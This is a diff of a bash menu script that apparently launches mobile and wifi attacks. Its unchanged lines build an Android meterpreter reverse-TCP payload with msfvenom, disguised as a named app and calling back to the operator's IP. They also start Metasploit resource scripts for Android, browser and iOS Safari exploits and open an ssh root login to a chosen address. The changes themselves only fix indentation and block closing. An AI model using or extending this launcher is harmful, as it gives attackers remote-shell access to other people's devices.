@@ -28,7 +28,7 @@ if [[ "$f" == 'first' || "$f" == '1'  ]];
  echo "2.App-exploit"
  read s
  if [[ "$s" == 'app' || "$s" == '2'  ]];
- then
+  then
   echo "enter your ip address:"
   echo "need ip address? (local) (y/n) :"
   read i
@@ -41,7 +41,7 @@ if [[ "$f" == 'first' || "$f" == '1'  ]];
      then 
       echo "no need for them ip addresses "
       echo "ip address: "
-   fi
+    fi
   read ip
   echo $ip >>ipfile
   echo " app name:"
@@ -52,25 +52,26 @@ if [[ "$f" == 'first' || "$f" == '1'  ]];
     msfvenom -p android/meterpreter/reverse_tcp lhost=$ip lport=556 R> $name
     msfconsole -r android.rc
 fi
-fi
+
 
 if [[ "$s" == 'browser' || "$s" == '1' ]]
  then
  msfconsole -r browser.rc
-
+fi
+fi
 #60
 if [[ "$f" == 'second' || "$f" == '2' ]];
  then 
  echo --Ios Exploits--
  echo "1.Browser-based exploit "
  echo "2.App-exploit (coming Soon)"
-read c
-if [[ "$c" == 'browser' ]];
-then
-msfconsole -r safari.rc
+ read c
+ if [[ "$c" == 'browser' ]];
+   then
+   msfconsole -r safari.rc
 #70
-fi
-fi
+  fi
+ fi
 if [[ "$f" == 'third' || "$f" == 'wifi' || "$f" == '3'  ]];
  then
  echo "--Wifi Exploit--"
@@ -109,8 +110,7 @@ read ras
 ping $ras
 sleep 2
 ssh root@$ras
-
 fi
 echo bye bitcheass
 sleep 2
-fi
+
